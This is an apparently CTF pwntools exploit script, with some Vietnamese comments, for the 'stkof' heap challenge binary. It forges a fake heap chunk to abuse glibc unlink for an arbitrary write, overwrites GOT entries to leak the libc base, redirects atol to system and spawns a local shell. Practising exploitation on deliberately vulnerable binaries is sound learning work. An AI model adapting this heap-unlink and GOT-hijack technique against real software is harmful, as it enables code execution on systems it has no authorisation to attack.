#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stkof_patched
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './stkof_patched')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x00400d29
bp 0x00400b7a
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

def choice_1(size: int):
    io.sendline(b"1")
    io.sendline(str(size).encode(encoding='utf-8'))
    io.recvuntil(b"OK")
    
def choice_2(idx: int, input: bytes):
    io.sendline(b"2")
    io.sendline(str(idx).encode(encoding='utf-8'))
    io.sendline(str(len(input)).encode(encoding='utf-8'))
    io.send(input)
    io.recvuntil(b"OK")

def choice_3(idx: int):
    io.sendline(b"3")
    io.sendline(str(idx).encode(encoding='utf-8'))
    io.recvuntil(b"OK")
    
def choice_4(idx: int):
    io.sendline(b"4")
    io.sendline(str(idx).encode(encoding='utf-8'))
    io.recvline()
    return io.recvuntil(b"OK\n")

global_array = 0x00602140
size_of_fake_chunk = 0x20
size_if_will_free_chunk = 0x80 # if this < 0x80 then fail

io = start()

# heap preparation

choice_1(0x10) # 1
choice_1(0x10) # 2
choice_1(size_of_fake_chunk)        # 3: unlink this
choice_1(size_if_will_free_chunk)   # 4: free this

# exploit unlink macro ⇒ arbitrary write
## payload can contain null bytes
heap_overflow_payload = b""
heap_overflow_payload += p64(0)                                 # prev_size fake chunk
heap_overflow_payload += p64(size_of_fake_chunk + 1)            # size fake chunk
heap_overflow_payload += p64(global_array)                      # fd fake chunk, to bypass sec check, this must equal to (&global_array[3] - 3)
heap_overflow_payload += p64(global_array + 0x8)                # bk fake chunk, to bypass sec check, this must equal to (&global_array[3] - 2)
heap_overflow_payload += p64(size_of_fake_chunk)                # prev_size chunk 4: must equal to size of fake chunk
heap_overflow_payload += p64(size_if_will_free_chunk + 0x10)    # size chunk 4: change the last bit to 0
choice_2(3, heap_overflow_payload)
choice_3(4)
# --- end --- from here, global_array[3] = &global_array[0]

# exploit arbitrary write => arbitrary read
choice_2(3, p64(exe.got['strlen'])) # write got['strlen'] to global_array[0]
choice_2(0, p64(exe.plt['puts'])) # write plt['puts'] to got['strlen']
# --- end --- from here, choice_4(0) will puts *(global_array[0])

# arbitrary read ⇒ leak libc base
leaked_printf = b""

for i in range(8):
    choice_2(3, p64(exe.got['printf'] + i))
    recv = choice_4(0)
    if recv[0:1] != b'\n':
        leaked_printf = recv[:6-i]                  # 2 bytes đầu của địa chỉ luôn là null
        leaked_printf = leaked_printf[::-1]         # do hàm puts đọc kiểu string nên cần đảo ngược về int
        leaked_printf += b"\x00" * i                # số bytes skip được thêm lại
        leaked_printf = int.from_bytes(leaked_printf)
        libc.address = leaked_printf - libc.symbols['printf']
        break
    
print(f"libc base: {hex(libc.address)}")
# --- end ---

# spawn shell
## overwrite got['stol'] = system
choice_2(3, p64(exe.got['atol']))
choice_2(0, p64(libc.symbols['system']))

## call choice_4 then input idx = "/bin/sh\x00"
io.sendline(b"4")
io.sendline(b"/bin/sh\x00")
# --- end ---

# happy shell
io.interactive()
